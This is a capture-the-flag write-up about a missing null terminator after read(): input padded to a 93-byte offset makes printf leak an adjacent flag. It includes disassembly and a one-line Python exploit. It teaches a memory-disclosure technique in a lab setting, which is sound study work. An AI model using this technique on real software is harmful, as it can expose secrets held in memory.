In this challenge the program reads the flag but never prints it 

It also accepts user input using `read()` syscall which does not terminate with null character 

The flag read from the file is stored after the user input

So if the user input is long enough to be just before the flag then the `printf` function that was only meant to print the user input will also print the flag because print function prints until it encounters a null character

From objdump 

    0x0000000000001750 <+149>:   mov    rax,QWORD PTR [rbp-0x178]                                                                                                                                                   
    0x0000000000001757 <+156>:   mov    edx,0x100                                                                                                                                                                   
    0x000000000000175c <+161>:   mov    rsi,rax                                                                                                                                                                     
    0x000000000000175f <+164>:   mov    edi,ecx                                                                                                                                                                     
    0x0000000000001761 <+166>:   call   0x1140 <read@plt>    

The flag will put at address `rbp - 0x178` 

The user input is at this location 

    0x7ffd57907cd0: 0x000a4141 

The offset is 93

The exploit 

    python -c 'import sys, time; sys.stdout.buffer.write(b"100"); time.sleep(1); sys.stdout.buffer.write(b"A"*93);'
